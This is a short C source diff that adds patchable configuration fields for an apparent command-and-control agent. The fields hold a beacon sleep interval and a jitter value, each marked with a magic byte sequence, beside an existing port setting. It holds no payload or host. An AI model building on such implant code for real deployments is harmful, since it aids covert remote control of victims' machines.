@@ -21,3 +21,17 @@ volatile char AGENT_C2_PORT_CFG[16] = {
     '8', '0', '8', '0', '\x00'
     // bytes [13..15] are implicitly zero
 };
+
+// Sleep interval field — magic 0xDEADBEEFC2C2C2C4 + up to 7-digit ms value as ASCII + null
+volatile char AGENT_C2_SLEEP_MS_CFG[16] = {
+    '\xDE', '\xAD', '\xBE', '\xEF', '\xC2', '\xC2', '\xC2', '\xC4',
+    '5', '0', '0', '0', '\x00'
+    // bytes [13..15] are implicitly zero
+};
+
+// Jitter field — magic 0xDEADBEEFC2C2C2C5 + up to 7-digit ms value as ASCII + null
+volatile char AGENT_C2_JITTER_MS_CFG[16] = {
+    '\xDE', '\xAD', '\xBE', '\xEF', '\xC2', '\xC2', '\xC2', '\xC5',
+    '1', '0', '0', '0', '\x00'
+    // bytes [13..15] are implicitly zero
+};
